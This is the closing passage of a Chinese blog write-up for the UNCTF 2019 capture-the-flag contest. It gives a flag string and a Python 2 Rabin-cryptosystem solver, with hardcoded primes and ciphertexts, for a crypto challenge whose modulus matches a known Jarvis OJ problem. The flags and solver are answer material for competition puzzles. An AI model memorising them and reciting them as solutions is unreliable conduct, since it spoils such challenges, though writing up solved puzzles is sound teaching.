<h4 id="flag-23"><a href="#flag-23" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;ac01dff95336aa470e3b55d3fe43e9f6&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="一句话加密"><a href="#一句话加密" class="headerlink" title="一句话加密"></a>一句话加密</h2><h4 id="Description-24"><a href="#Description-24" class="headerlink" title="Description"></a>Description</h4><p>​         Easy_Crypto 答案提交flag{}括号内的值。 </p>
<h4 id="Analyze-24"><a href="#Analyze-24" class="headerlink" title="Analyze"></a>Analyze</h4><p>​         找到图片最后的n，发现n和Jarvis OJ Hard RSA的一模一样。。。然后之前有存那个的Rabin攻击脚本，就直接一把梭了</p>
<h4 id="Solve-24"><a href="#Solve-24" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(num)</span>:</span></span><br><span class="line">    t = hex(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">'0'</span>+t).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> t.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(c)</span>:</span></span><br><span class="line">    p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">    q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">    n = p*q</span><br><span class="line">    r = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">    s = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">    a = gmpy.invert(p,q)</span><br><span class="line">    b = gmpy.invert(q,p)</span><br><span class="line">    x =(a*p*s+b*q*r)%n</span><br><span class="line">    y =(a*p*s-b*q*r)%n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> n2s(x%n) </span><br><span class="line">    <span class="keyword">print</span> n2s((-x)%n)</span><br><span class="line">    <span class="keyword">print</span> n2s(y%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-y)%n)</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">62501276588435548378091741866858001847904773180843384150570636252430662080263</span></span><br><span class="line">c2 = <span class="number">72510845991687063707663748783701000040760576923237697638580153046559809128516</span></span><br><span class="line">solve(c1)</span><br><span class="line">solve(c2)</span><br></pre></td></tr></table></figure>

<h4 id="flag-24"><a href="#flag-24" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;412a1ed6d21e55191ee5131f266f5178&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>​        最后说一句，这次题目质量还行，做得很爽（肝了一周。。。），但是里面有些题还是比较偏向脑洞和开发23333，希望比赛以后越办越好吧</p>

                            <hr>
                        </div>
                        <br>
                        <div>
                            
                            <p>
                                <i class="iconfont icon-tag"></i>
                                
                                    <a class="hover-with-bg" href="/tags/CTF">CTF</a>
                                
                                    <a class="hover-with-bg" href="/tags/UNCTF">UNCTF</a>
                                
                            </p>
                            
                                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
                            
                        </div>
                    </div>
                </div>
            </div>
        <div class="d-none d-lg-block col-lg-2 toc-container">
            
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>
</div>

<!-- custom -->

    <div class="col-lg-7 mx-auto nopadding-md">
        <div class="container custom post-content mx-auto">
            <img src="https://i.loli.net/2019/10/31/4aM6iEW3L2OY9oj.jpg" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
        </div>
    </div>


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
    <div class="container comments mx-auto" id="comments">
        
            <br><br>
            
            <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script>               
        var disqus_shortname = 'FzWjScJ# your shortname';
        var disqus_config = function () {
            this.page.url = 'http://fzwjscj.top/2019/10/30/UNCTF_wp/'; 
            this.page.identifier = '/2019/10/30/UNCTF_wp/';
        };
        (function() { 
            var d = document, s = d.createElement('script');
            s.type = 'text/javascript';
            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments powered by Disqus.</a></noscript>
</div>
        
    </div>
</div>
    
</main>

<footer class="mt-5">
  <div class="text-center py-3">
    <span id="busuanzi_container_site_uv">
     本站访客数<span id="busuanzi_value_site_uv"></span>人次
    </span>
    <br>
    
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="/lib/mdbootstrap/js/jquery-3.4.1.min.js"></script>
  <script src="/lib/mdbootstrap/js/popper.min.js"></script>
  <script src="/lib/mdbootstrap/js/bootstrap.min.js?v=4.3.1"></script>
  <script src="/lib/mdbootstrap/js/mdb.min.js?v=4.8.7"></script>
  <script src="/lib/nprogress/nprogress.min.js?v=0.2.0"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
    
    <script src="/js/post.js"></script>
  
  
    <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
    <script>
      $(document).ready(function(){
        $('pre').addClass('prettyprint linenums');
        prettyPrint();
      })
    </script>
  
  
    <script src="/lib/typed/typed.min.js?v=2.0.9"></script>
    <script>
        var typed = new Typed('#subtitle', {
          strings: [
            '  ',
            "UNCTF——我真的肝不动了。。。&nbsp;",
        ],
        cursorChar: "_",
        typeSpeed: 70,
        startDelay: 300, //开始之前延迟300毫秒
        loop: false,
        });
        $(".typed-cursor").addClass("h2");
    </script>
  
  
    <script src="/lib/anchor/anchor.min.js?v=4.2.0"></script>
    <script>
      anchors.options = {
        placement: "right",
        visible: "false",
        
        icon: "§" 
        
      };
      anchors.add(".post-content > h1,h2,h3,h4,h5,h6");
    </script>
  
</body>
</html>